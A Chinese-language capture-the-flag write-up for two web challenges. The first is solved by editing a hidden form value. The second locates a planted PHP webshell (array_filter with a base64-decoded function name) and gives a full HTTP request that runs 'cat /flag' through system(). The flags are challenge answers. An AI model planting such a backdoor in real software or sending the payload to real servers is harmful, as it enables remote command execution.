# WP
## Web 1 ezGetFlag
### 操作内容
出现页面，带个按钮，点一下试试。
提示需要再点 9 下，那就点吧。
![[Pasted image 20241124180914.png]]

![[Pasted image 20241124181032.png]]
提示将 POST 改成 GET。

但是这里并不是改成 POST 传参，F12 查看源码，发现：
![[Pasted image 20241124181227.png]]

根据 ID，找到对应的标签:
![[Pasted image 20241124181306.png]]

将 `value` 改成 `POST` 即可获得 flag。
### flag
flag{dd4d2086-47fe-4b51-8505-1ead5fc89182}
## Web 2 ezFindShell
### 操作内容
"Separate the wheat from the chaff"  --  “去其糟粕，取其精华”

下载题目给的 `www.zip`，发现里面是一大堆 `.php` 文件。
![[Pasted image 20241124181849.png]]

题目提示是要找 shell，那么最常见的可供用户控制的输入，在 PHP 中，就是 `$_GET $_REQUEST $_POST`。

使用 VSC 的全局搜索功能，发现在 `1de9d9a55a824f4f8b6f37af76596baa.php` 文件中找到了 `$_REQUEST`。

关键代码：
```php
$e=$_REQUEST['e'];
$arr=array($_POST['POST'],);
array_filter($arr,base64_decode($e));
```

拿到 GET 或者 POST 传参中的参数名为 `e` 的参数，再拿到 POST 传参中的参数名为 `POST` 的参数，并将其转化为数组。接下来再对 `e` 这个函数名进行 `base64` 解码。再将 `$arr` 中的值一一放到解码后的函数中跑一遍。

那么就存在代码执行漏洞。令 `e` 为 `base64` 编码后的 `system`，将 `POST` 设为我们想要的命令。

payload:
```http
POST /1de9d9a55a824f4f8b6f37af76596baa.php?e=c3lzdGVt HTTP/1.1
Host: eci-2zefwo35pdxrsn1z5nx7.cloudeci1.ichunqiu.com
Content-Length: 16
Cache-Control: max-age=0
Origin: http://eci-2zefwo35pdxrsn1z5nx7.cloudeci1.ichunqiu.com
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://eci-2zefwo35pdxrsn1z5nx7.cloudeci1.ichunqiu.com/1de9d9a55a824f4f8b6f37af76596baa.php?e=c3lzdGVt
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Cookie: chkphone=acWxNpxhQpDiAchhNuSnEqyiQuDIO0O0O; Hm_lvt_2d0601bd28de7d49818249cf35d95943=1732284697,1732358658,1732371363,1732411058; Hm_lpvt_2d0601bd28de7d49818249cf35d95943=1732411058; HMACCOUNT=D12E601BF2C7495A; _tea_utm_cache_10000007=undefined
Connection: keep-alive

POST=cat+%2Fflag
```
### flag
flag{f882df82-381d-4e07-8579-585934f4519e}
